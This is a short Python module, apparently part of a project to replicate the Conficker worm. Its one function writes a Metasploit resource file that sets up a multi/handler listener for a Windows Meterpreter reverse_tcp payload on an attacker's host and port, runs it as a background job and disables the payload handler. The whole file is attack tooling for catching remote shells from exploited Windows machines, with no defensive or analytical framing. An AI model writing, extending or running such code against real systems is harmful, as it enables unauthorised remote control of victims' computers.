#!/usr/bin/python3

"""
Replicating Conficker Worm
Module 2 - Writing Handler Setup in Resource file
"""

def setupHandler( resfile, lhost, lport ):
    resfile.write("use multi/handler\n")
    resfile.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
    resfile.write("set LHOST " + lhost + '\n')
    resfile.write("set LPORT " + str(lport) + '\n')
    resfile.write("exploit -j -z\n")
    resfile.write("set DisablePayloadHandler True\n")
